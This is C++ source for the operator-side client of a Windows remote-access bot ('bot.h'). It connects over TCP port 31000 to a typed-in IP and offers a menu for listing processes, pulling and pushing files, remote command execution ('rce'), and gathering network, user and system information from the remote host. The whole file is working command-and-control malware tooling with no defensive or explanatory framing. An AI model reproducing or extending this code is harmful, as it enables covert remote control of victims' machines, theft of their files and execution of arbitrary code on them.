// Client
// Right click project -> build options -> linker settings -> add "libwsock32"
#define WIN32_LEAN_AND_MEAN

#include "bot.h"
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>

#define BUF_SIZE 2000

void print_options(){
    string optList[8] = {"exit",
                "process_list",
                "dl_file",
                "ul_file",
                "rce",
                "net_info",
                "whoami",
                "sys_info"};

        // Print options
        for (int i=0; i < 8; i++){
            printf("%d - %s\n", i, optList[i].c_str());
        }
}

int main(){
  // Initialize Winsock
    WSADATA wsaData;
    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != NO_ERROR) {
        wprintf(L"WSAStartup function failed with error: %d\n", iResult);
        return 1;
    }
    //----------------------
    // Create a SOCKET for connecting to server
    SOCKET ConnectSocket;
    ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        wprintf(L"socket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    //----------------------
    // The sockaddr_in structure specifies the address family,
    // IP address, and port of the server to be connected to.
    sockaddr_in clientService;
    clientService.sin_family = AF_INET;
    printf("Enter the IP address to connect to: ");
    string ipAddr;
    getline(cin, ipAddr);
    clientService.sin_addr.s_addr = inet_addr(ipAddr.c_str());
    clientService.sin_port = htons(31000);

    //----------------------
    // Connect to server.
    iResult = connect(ConnectSocket, (SOCKADDR *) & clientService, sizeof (clientService));
    if (iResult == SOCKET_ERROR) {
        wprintf(L"connect function failed with error: %ld\n", WSAGetLastError());
        iResult = closesocket(ConnectSocket);
        if (iResult == SOCKET_ERROR)
            wprintf(L"closesocket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    // Begin talking with Server here.
    char recvBuffer[BUF_SIZE];
    char sendBuffer[BUF_SIZE];
    string userInput;
    string userOpt;

    wprintf(L"Connected to server.\n");
    printf("Accepting data from server\n");

    do {
        print_options();

        printf("\nEnter a command to execute: ");
        memset(&sendBuffer, 0, sizeof(sendBuffer));
        memset(&recvBuffer, 0, sizeof(recvBuffer));
        getline(cin, userOpt);
        strcat(sendBuffer, userOpt.c_str());
        send_data(ConnectSocket, sendBuffer);

        switch(atoi(userOpt.c_str())){
            case 1:{
                get_output(ConnectSocket, recvBuffer).c_str();
                break;
            }
            case 2:{
                printf("Enter the filename: ");
                getline(cin,userInput);
                memset(&sendBuffer, 0, sizeof(sendBuffer));
                strcat(sendBuffer, userInput.c_str());
                //send filename
                send_data(ConnectSocket, sendBuffer);
                //recv file data
                memset(&recvBuffer, 0, sizeof(recvBuffer));
                string data = get_output(ConnectSocket,recvBuffer);

                ofstream myfile;
                myfile.open(userInput.c_str());
                myfile << data;
                break;
            }
            case 3:{
                printf("Enter the filename: ");
                getline(cin,userInput);
                memset(&sendBuffer, 0, sizeof(sendBuffer));
                strcat(sendBuffer, userInput.c_str());
                //send filename
                send_data(ConnectSocket, sendBuffer);
                //Get file data
                dl_file(ConnectSocket, userInput);

                send_data(ConnectSocket, "<END>");

                break;
            }
            case 4:{
                printf("Enter command: ");
                getline(cin,userInput);
                memset(&sendBuffer, 0, sizeof(sendBuffer));
                strcat(sendBuffer, userInput.c_str());
                send_data(ConnectSocket, sendBuffer);
                get_output(ConnectSocket, recvBuffer).c_str();
                break;
            }
            case 5:{
                get_output(ConnectSocket, recvBuffer).c_str();
                break;
            }
            case 6:{
                get_output(ConnectSocket, recvBuffer).c_str();
                break;
            }
            case 7:{
                get_output(ConnectSocket, recvBuffer).c_str();
                break;
            }
        }

    }while (atoi(userOpt.c_str()) != 0);

    // End connection with Server
    wprintf(L"Closing socket connection.\n");
    iResult = closesocket(ConnectSocket);
    if (iResult == SOCKET_ERROR) {
        wprintf(L"closesocket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    WSACleanup();
    return 0;
}
